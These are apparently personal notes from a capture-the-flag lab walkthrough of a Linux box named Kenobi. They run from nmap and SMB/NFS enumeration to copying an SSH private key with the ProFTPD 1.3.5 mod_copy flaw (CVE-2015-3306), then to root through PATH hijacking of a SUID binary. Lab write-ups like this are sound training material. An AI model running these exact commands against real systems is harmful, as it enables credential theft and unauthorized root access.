<pre>
Ran service discovery scan
- nmap -Pn -A -sV -Sc -F

Results:

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn&apos;t have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)  &lt;&lt;!
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      45831/tcp6  mountd
|   100005  1,2,3      54366/udp   mountd
|   100005  1,2,3      54927/tcp   mountd
|   100005  1,2,3      59568/udp6  mountd
|   100021  1,3,4      33981/tcp   nlockmgr
|   100021  1,3,4      36425/tcp6  nlockmgr
|   100021  1,3,4      49118/udp6  nlockmgr
|   100021  1,3,4      54719/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  &lt;&lt;!
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu) &lt;&lt;!
|   NetBIOS computer name: KENOBI\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-14T14:19:57-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-14T20:19:57
|_  start_date: N/A


Noteable finds:
 - port 111 rpcbind
 - port 445 samba service
 - port 21 proFTPD server version 1.3.5
--------------------------------------------------------------------------------------------------

Enumerating samba:

Ran smb enumeration scan with nmap
 - nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.66.72

Scan Results:
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.66.72\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.66.72\anonymous: <<!
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share <<!
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.66.72\print$:
|     warning: Couldn't get details for share: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|     Anonymous access: <none>
|    Current user access: <none>
|_______________________________________________________________________

Noteable finds:
 - user kenobi
 - user anonymous

connecting via smbclient:
 - smbclient //10.10.241.98/anonymous
 - found file log.txt, permission denied
 - downloaded log.txt onto host machine using smbget -R smb://10.10.241.98/anonymous
 - log.txt was a proFTPD config file
 - port 21 is default port for proFTPD
--------------------------------------------------------------------------------------------------

Identifying Vulnerabilities:
 - ProFTPD 1.3.5 Server
 - vulnerable to CVE-2015-3306
 - mod_copy_module allows attackers to read/write arbitrary files via (site cpfr and site cpto) commands

Additional Notes:
 mod_copy_module implements SITE CPTO/SITE CPFR commands which is used to copy,
 files/directories from the server without transferring data to the client and back
 --------------------------------------------------------------------------------------------------

Enumerating file system on port 111 with nmap:
 - nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.241.98
 - found mount /var
--------------------------------------------------------------------------------------------------

Exploiting cve-2015-3306:

Mounting /var/ dir. to host machine
 - sudo mkdir /mnt/kenobiNFS
 - sudo mount 10.10.241.98:/var /mnt/kenobiNFS

Copying kenobi's Private key to mounted /var/ dir.
 - nc 10.10.241.98 21
 - SITE CPFR /home/kenobi/.ssh/id_rsa
 - SITE CPTO /var/tmp/id_rsa
--------------------------------------------------------------------------------------------------

Gaining local Privilege Escalation:

Copy private key from mount to host machine dir. in order to use for priv esc
 - cp /mnt/kenobiNFS/tmp/id_rsa
 - sudo chmod 600 id_rsa (connecting via ssh requires private key file to have strict permissions)
 - ssh -i id_rsa kenobi@10.10.241.98

Gained local priv esc
--------------------------------------------------------------------------------------------------

Gaining Root via Path Manipulation:
- searched for binary files with suid bit permission (execs file as owner)
- find / -perm -u=s -type f 2>/dev/null
- found /usr/bin/menu it runs as root w/ no path

Running the binary returns,

********************
1. status check
2. kenrel version
3. ifconfig
** Enter your choice:
*********************

Creating a shell to gain root
 - echo /bin/sh > curl (copies shell to curl)
 - chmod 777 curl
 - export PATH=/tmp:$PATH (Puts the shell in our /tmp path)
 - /usr/bin/menu

 When /usr/bin/menu is run it uses our path to find the 'curl' binary,
 because the menu binary runs as root so does our shell gaining root access.
--------------------------------------------------------------------------------------------------
</pre>
